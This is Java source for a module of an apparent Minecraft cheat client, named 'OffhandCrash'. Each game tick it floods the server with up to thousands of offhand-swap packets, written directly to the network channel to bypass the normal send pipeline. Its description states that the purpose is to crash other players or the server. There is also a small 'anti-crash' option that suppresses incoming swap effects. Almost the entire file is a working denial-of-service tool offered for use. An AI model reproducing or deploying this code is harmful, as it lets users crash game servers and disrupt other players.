package com.tricrotism.modules.crash;

import com.tricrotism.SageFang;
import com.tricrotism.api.eventbus.EventHandler;
import com.tricrotism.api.menus.Menu;
import com.tricrotism.api.modules.Module;
import com.tricrotism.events.game.GameQuitEvent;
import com.tricrotism.events.world.TickEvent;
import com.tricrotism.mixin.accessors.ConnectionAccessor;
import imgui.ImGui;
import imgui.ImGuiIO;
import imgui.flag.ImGuiWindowFlags;
import io.avaje.config.Config;
import io.netty.channel.Channel;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.network.Connection;
import net.minecraft.network.protocol.game.ServerboundPlayerActionPacket;

/**
 * Offhand crash exploit — floods the server with offhand swap packets
 * written directly to the Netty channel, bypassing the normal send pipeline.
 * <p>
 * Can also act as anti-crash by suppressing incoming swap sounds/animations
 * when another player attempts the same exploit on you.
 */
public class OffhandCrash extends Module implements Menu {

    public static final OffhandCrash instance = new OffhandCrash();

    private static final ServerboundPlayerActionPacket SWAP_PACKET = new ServerboundPlayerActionPacket(
        ServerboundPlayerActionPacket.Action.SWAP_ITEM_WITH_OFFHAND,
        BlockPos.ZERO,
        Direction.UP
    );

    public OffhandCrash() {
        super("offhandcrash", "Offhand Crash", "Flood offhand swap packets to crash other players or the server.", "Combat");
    }

    private boolean doCrash() {
        return Config.getBool(baseConfig + ".doCrash", true);
    }

    private void setDoCrash(boolean v) {
        Config.setProperty(baseConfig + ".doCrash", String.valueOf(v));
    }

    private int speed() {
        return Config.getInt(baseConfig + ".speed", 2000);
    }

    private void setSpeed(int v) {
        Config.setProperty(baseConfig + ".speed", String.valueOf(v));
    }

    private boolean antiCrash() {
        return Config.getBool(baseConfig + ".antiCrash", true);
    }

    private void setAntiCrash(boolean v) {
        Config.setProperty(baseConfig + ".antiCrash", String.valueOf(v));
    }

    /**
     * Returns true if this module is active and anti-crash is enabled.
     * Other mixins can check this to suppress incoming offhand swap effects.
     */
    public boolean isAntiCrash() {
        return isActive() && antiCrash();
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!isActive() || !doCrash()) return;

        Minecraft mc = Minecraft.getInstance();
        if (mc.player == null || mc.getConnection() == null) return;

        Connection connection = mc.getConnection().getConnection();
        Channel channel = ((ConnectionAccessor) connection).sagefang$getChannel();
        if (channel == null || !channel.isOpen()) return;

        int count = speed();
        for (int i = 0; i < count; i++) {
            channel.write(SWAP_PACKET);
        }
        channel.flush();
    }

    @EventHandler
    private void onGameLeft(GameQuitEvent event) {
        if (isActive()) {
            toggle();
        }
    }

    @Override
    public void frame(ImGuiIO io) {
        try {
            if (!isVisible()) return;

            int flags = ImGuiWindowFlags.AlwaysAutoResize;
            ImGui.setNextWindowBgAlpha(0.45f);
            ImGui.begin(title, flags);

            if (ImGui.checkbox("Enabled##ohcEnabled", isActive())) {
                toggle();
            }
            ImGui.separator();

            boolean crash = doCrash();
            if (ImGui.checkbox("Send Packets##ohcDoCrash", crash)) {
                setDoCrash(!crash);
            }
            if (ImGui.isItemHovered()) {
                ImGui.setTooltip("Send offhand swap packets each tick");
            }

            if (crash) {
                int[] speedArr = {speed()};
                if (ImGui.sliderInt("Packets/tick##ohcSpeed", speedArr, 1, 10000)) {
                    setSpeed(speedArr[0]);
                }
            }

            ImGui.separator();

            boolean anti = antiCrash();
            if (ImGui.checkbox("Anti-Crash##ohcAnti", anti)) {
                setAntiCrash(!anti);
            }
            if (ImGui.isItemHovered()) {
                ImGui.setTooltip("Suppress incoming offhand swap effects to prevent being crashed");
            }

            ImGui.end();
        } catch (Exception e) {
            SageFang.LOGGER.error("Error in OffhandCrash menu", e);
        }
    }
}
